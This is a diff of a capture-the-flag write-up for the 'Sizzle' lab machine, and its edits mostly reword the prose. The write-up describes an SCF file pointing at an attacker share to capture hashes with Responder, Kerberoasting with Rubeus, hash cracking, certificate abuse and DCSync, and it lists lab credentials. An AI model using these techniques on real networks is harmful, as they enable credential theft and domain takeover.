@@ -231,7 +231,7 @@ smb: \Users\> ls
 		7779839 blocks of size 4096. 2558294 blocks available
 ```
 
-After some enumeration, I found that we have write permission on `\Users\Public` and I PayloadsAllTheThings I found we can do SCF attack.
+After some enumeration, I found that we have write permission on `\Users\Public` and by checking ![PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share) I found that we can do SCF attack.
 
 SCF (Shell Command Files) files can be used to access a specific UNC path (//) which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.
 
@@ -243,9 +243,7 @@ IconFile=\\10.10.14.4\Share\test.ico
 Command=ToggleDesktop
 ```
 
-> [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)
-
-I created the .scf file and put that in Public directory.
+I created the .scf file and put that in Public directory. And Started my Responder on other side `responder -I tun0`.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%201.png)
 
@@ -300,7 +298,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-Checking `/certsrv` it asks for authentication and we got a valid username and password already. `amanda : Ashare1972`       
+Checking `/certsrv` it asks for authentication and we got a valid username and password already. `amanda : Ashare1972` That helped me to login.    
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png)
 
@@ -310,8 +308,7 @@ Its a Windows AD Certificate Services.
 
 > **What is Active Directory Certificate Services (AD CS)? According to Microsoft, AD CS is the “Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.”**
 
-Checking through the links. By clicking on the “Request a certificate” link on the page, and it will give me another page to request a type.
-
+By clicking the “Request a certificate” link on the page, and it gives me two options.
 By Checking "Advanced Certificate Request" we can add sign our own key.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%205.png)
@@ -420,17 +417,17 @@ To do Kerberoasting there are various tool, but we can try this Rubeus
 
 > [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
 
-So when running that make sure you use kerberoast option and also mention the user and her password.
+When running that make sure you use kerberoast option and also mention the user and her password.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%207.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%207.png)
 
-The hashes of `mrlky` is stored in hashes.txt file as I mentioned it when running.
+The hashes of `mrlky` is stored in hashes.txt file as I mentioned it before.
 
 I used hashcat to crack the hash and got the password as `Football#7`
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%208.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%208.png)
 
-Before login, we can't use this password so you need to create the public and private keys as we did before. Make sure you login with `mrlky : Football#7` in `/certsrv` and create those keys again.
+For login, we can't use this password in evil-winrm so you need to create the public and private keys as we did before. Make sure you login with `mrlky : Football#7` in `/certsrv` and create those keys again.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png)
 
@@ -452,7 +449,7 @@ htb\mrlky
 
 ## Privilege Escalation
 
-I just run SharpHound again and to copy that to our machine, I just used the SMB Share `Department Shares\Users\Public` and download via smbclient in my machine.
+I just run SharpHound again and to copy that to our machine, I used the SMB Share `Department Shares\Users\Public` and download via smbclient in my machine.
 
 ```bash
 *Evil-WinRM* PS C:\windows\system32\spool\drivers\color> copy 20200731001658_BloodHound.zip 'C:\Department Shares\Users\Public'
@@ -477,7 +474,7 @@ By Checking the Queries, I can see mrlky is in DCSync Rights. So We can do DCSyn
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/test%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/test%201.png)
 
-MRLKY has both GetChanges and GetChangesAll, which is what we want to do a DCSync Attack. We can also check that by right click the path and `?Info` will reveal how to abuse it.
+MRLKY has both GetChanges and GetChangesAll, which is what we want, to do a DCSync Attack. We can also check that by right click the path and `?Info` will reveal how to abuse it.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%209.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%209.png)
 
